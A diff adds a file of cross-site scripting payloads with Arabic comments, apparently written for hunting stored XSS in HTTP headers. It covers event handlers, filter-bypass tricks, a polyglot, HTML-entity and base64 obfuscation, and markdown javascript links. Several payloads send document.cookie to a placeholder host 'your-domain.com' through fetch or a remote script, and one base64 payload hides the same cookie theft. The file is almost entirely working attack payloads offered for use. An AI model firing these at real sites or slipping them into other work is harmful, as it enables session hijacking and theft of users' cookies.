@@ -1,0 +1,61 @@
+# This list we will using with https://malekabuliala.github.io/List-s-me/list_xss_stored_header_injection.txt list becuese we need extracted xss Stored from header
+
+# 1. حمولة الـ "Event Handlers" (بدون كلمة script)
+<details open ontoggle=confirm(1)>
+<video><source onerror=eval(atob('YWxlcnQoJ1B3bmVkJycp'))>
+<marquee onstart=confirm(1)>
+<body onload=prompt(document.cookie)>
+<svg/onload=fetch(`//your-domain.com/${document.cookie}`)>
+
+
+# 2. حمولة تجاوز فلاتر الكلمات (String Recovery)
+# (تستخدم لتوليد كلمة alert من حروف متفرقة)
+<img src=x onerror="this['al'+'ert'](1)">
+<img src=x onerror="[1].map(alert)">
+
+
+# 3. حمولة الـ "Blind XSS" المتقدمة
+# (حقن رابط خارجي داخل وسم لا يشك فيه الفلتر)
+<b onmouseover=import('//your-domain.com/log.js')>hover_me</b>
+<ul style="list-style-image: url('javascript:confirm(1)')">
+
+
+# 4. حمولات الـ "Polyglot" (تعمل في أي مكان: سمة، نص، أو كود)
+# (حمولة واحدة مصممة لتجربة عدة سياقات في وقت واحد)
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></link></table><script>fetch(`//your-domain.com/${document.cookie}`)</script>
+
+
+
+# 5. تجاوز فلاتر الـ "Blacklist" باستخدام التشفير الرقمي (HTML Entities)
+
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">Click Me</a>
+
+
+# 6. استخدام الـ "Template Literals" (بدون أقواس)
+
+<svg onload=alert`1`>
+
+
+# 7. حمولة الـ "Style Attribute" (تعمل في بعض المتصفحات القديمة/المخصصة)
+
+<div style="width: expression(alert('XSS'));">
+
+# حمولة بسيطة للتأكد (لو كنت بتشوف النتيجة)
+
+<script>alert(document.cookie)</script>
+
+# حمولة "الصياد" (تتصل بسيرفرك الخارجي - الأقوى)
+
+<script src="https://your-domain.com/log.js"></script>
+
+# حمولة تجاوز الفلاتر (SVG)
+
+<svg/onload=fetch('https://your-domain.com/'+document.cookie)>
+
+# حمولة مشفرة (Base64)
+
+<img src=x onerror=eval(atob('ZmV0Y2goImh0dHBzOi8veW91ci1kb21haW4uY29tLyIrZG9jdW1lbnQuY29va2llKQ=='))>
+
+# حمولة خاصة بالـ Markdown (لو كان الموقع بيستخدمه)
+
+[clickme](javascript:confirm(1))
